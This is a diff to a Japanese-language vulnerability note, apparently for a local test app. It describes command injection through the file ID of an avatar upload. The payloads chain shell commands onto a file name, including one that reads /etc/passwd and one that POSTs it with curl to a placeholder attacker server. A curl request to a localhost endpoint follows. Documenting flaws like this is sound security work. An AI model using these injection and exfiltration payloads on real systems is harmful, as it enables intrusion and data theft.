@@ -14,14 +14,12 @@
 
 ## 攻撃方法
 1. プロフィール編集画面でアバター画像をアップロードする際に、ファイルIDに悪意のあるコマンドを含める
-2. 例えば、以下のようなファイルIDを使用する：
-   - `avatar.jpg; ls -la /`
-   - `avatar.jpg && cat /etc/passwd`
-   - `avatar.jpg | curl -X POST -d @/etc/passwd https://攻撃者のサーバー/`
-3. curlでファイルアップロードを実行する例
+    -  例えば、以下のようなファイルIDを使用する：
+        - `avatar.jpg; ls -la /`
+        - `avatar.jpg && cat /etc/passwd`
+        - `avatar.jpg | curl -X POST -d @/etc/passwd https://攻撃者のサーバー/`
+2. curlでファイルアップロードを実行する例
 ```bash
-# Base64エンコードされた画像データを含むcurlコマンド例
-# 小さなPNG画像をBase64エンコードしたデータ
 curl 'http://localhost:9090/api/profile/avatar' \
   -H 'Authorization: Bearer alice_token' \
   -H 'Content-Type: application/json' \
